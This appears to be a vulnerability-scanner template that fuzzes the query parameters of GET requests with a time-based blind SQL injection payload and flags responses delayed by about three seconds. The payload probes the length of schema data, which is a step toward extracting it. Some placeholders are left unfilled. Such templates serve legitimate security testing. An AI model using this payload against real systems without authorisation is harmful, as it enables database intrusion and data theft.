id: fuzz-sqli-custom

info:
  name: Custom SQL Injection Detection with Sleep
  author: netbaan
  severity: high
  description: |
    This template is designed to detect SQL Injection vulnerabilities by utilizing a conditional sleep payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli:
        - "SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '\\{where}\\'))={i} THEN sleep(3) ELSE sleep(0) END"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200  # Response must be 200 OK

      - type: time
        time: 
          - 3  # Verify if the response time is close to 3 seconds